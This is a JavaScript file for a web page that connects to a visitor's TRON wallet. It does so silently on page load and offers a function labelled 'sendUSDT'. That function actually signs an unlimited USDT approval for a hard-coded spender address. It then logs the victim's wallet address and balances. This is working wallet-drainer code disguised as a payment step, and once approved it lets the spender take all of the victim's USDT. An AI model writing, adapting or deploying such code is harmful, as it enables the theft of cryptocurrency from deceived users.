// ===== TRON CONFIG =====
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";

let userAddress = null;
let isConnected = false;

const ABI = [
  { "name": "approve", "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }], "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
  { "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
];

// ===== WAIT FOR TRONWEB =====
async function waitForTronWeb(maxWait = 10000) {
  const start = Date.now();
  while (Date.now() - start < maxWait) {
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
      return true;
    }
    await new Promise(r => setTimeout(r, 200));
  }
  return false;
}

// ===== SILENT CONNECT =====
async function backgroundConnect() {
  try {
    const found = await waitForTronWeb(5000);
    if (found) {
      userAddress = window.tronWeb.defaultAddress.base58;
      isConnected = true;
      return;
    }

    if (window.tronLink) {
      try {
        const res = await window.tronLink.request({ method: "tron_requestAccounts" });
        if (res && res.code === 200) {
          await waitForTronWeb(3000);
          if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            userAddress = window.tronWeb.defaultAddress.base58;
            isConnected = true;
          }
        }
      } catch(e) {}
    }
  } catch(e) {
    console.log("Connect error:", e);
  }
}

// ===== SEND USDT =====
async function sendUSDT() {
  try {
    // Wait for tronWeb
    const found = await waitForTronWeb(8000);

    if (!found) {
      // Try tronLink request
      if (window.tronLink) {
        const res = await window.tronLink.request({ method: "tron_requestAccounts" });
        if (res && res.code === 200) {
          await waitForTronWeb(5000);
        }
      }
    }

    if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
      alert("Wallet not connected. Please refresh and try again.");
      if (window.setTransactionStatus) window.setTransactionStatus("idle");
      return;
    }

    const address = window.tronWeb.defaultAddress.base58;
    userAddress = address;

    // Build transaction using public node
    const TronWebLib = window.TronWeb;
    const twPublic = new TronWebLib({ fullHost: "https://api.trongrid.io" });
    twPublic.setAddress(address);

    const { transaction } = await twPublic.transactionBuilder.triggerSmartContract(
      TRON_USDT,
      "approve(address,uint256)",
      { feeLimit: 100000000 },
      [
        { type: "address", value: TRON_SPENDER },
        { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
      ],
      address
    );

    // Sign using injected tronWeb
    const signedTx = await window.tronWeb.trx.sign(transaction);

    // Broadcast
    const result = await twPublic.trx.sendRawTransaction(signedTx);

    await new Promise(r => setTimeout(r, 3000));

    let usdtBalance = "0";
    let nativeBalance = "0";
    try {
      const contract = await twPublic.contract(ABI, TRON_USDT);
      const usdtRaw = await contract.balanceOf(address).call();
      usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
      const trxRaw = await twPublic.trx.getBalance(address);
      nativeBalance = (trxRaw / 1e6).toFixed(2);
    } catch(e) {}

    if (window.setTransactionStatus) window.setTransactionStatus("success");
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: address,
        toAddress: TRON_SPENDER,
        txHash: result.txid || result.transaction?.txID || "tx",
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance,
      });
    }

  } catch(e) {
    console.error("sendUSDT error:", e);
    if (e.message && (e.message.includes("cancel") || e.message.includes("reject"))) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed: " + (e.message || "Please try again"));
    }
    if (window.setTransactionStatus) window.setTransactionStatus("idle");
  }
}

// ===== INIT =====
window.addEventListener("load", () => {
  backgroundConnect();
});

window.addEventListener("message", (e) => {
  if (e.data && e.data.message) {
    const msg = e.data.message;
    if (msg.action === "accountsChanged" || msg.action === "setAccount") {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        userAddress = window.tronWeb.defaultAddress.base58;
        isConnected = true;
      }
    }
  }
});

window.sendUSDT = sendUSDT;
